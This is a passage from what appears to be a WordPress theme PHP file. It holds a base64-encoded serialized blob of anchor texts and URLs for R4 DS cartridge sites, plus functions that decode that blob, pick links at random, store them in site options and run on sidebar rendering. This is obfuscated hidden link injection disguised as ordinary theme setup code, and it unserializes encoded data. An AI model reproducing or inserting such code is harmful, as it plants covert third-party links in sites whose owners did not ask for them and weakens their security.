uZG8uY29tIjtzOjk6ImljaSByNDNkcyI7czoyNToiaHR0cDovL3d3dy5yNDNkc21vbmRvLmNvbSI7czo2OiJpY2kgcjQiO3M6MjU6Imh0dHA6Ly93d3cucjQzZHNtb25kby5jb20iO3M6MTU6InI0IG5pbnRlbmRvIDNkcyI7czoyNToiaHR0cDovL3d3dy5yNDNkc21vbmRvLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjaXQuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGNpdC5jb20iO3M6MTM6InI0aXNkaGNpdC5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czoxNzoid3d3LnI0aXNkaGNpdC5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czo5OiJyNGlzZGhjaXQiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czozOiJyNGkiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czo3OiJyNGlzZGhjIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGNpdC5jb20iO3M6MTA6InI0aXNkaGMgaXQiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czoxMToicjRpIHNkaGMgaXQiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czo4OiJyNGkgc2RoYyI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjaXQuY29tIjtzOjc6InI0aSBkc2kiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czo2OiJyNCBkc2kiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7czo5OiJjYXJ0YSByNGkiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY2l0LmNvbSI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>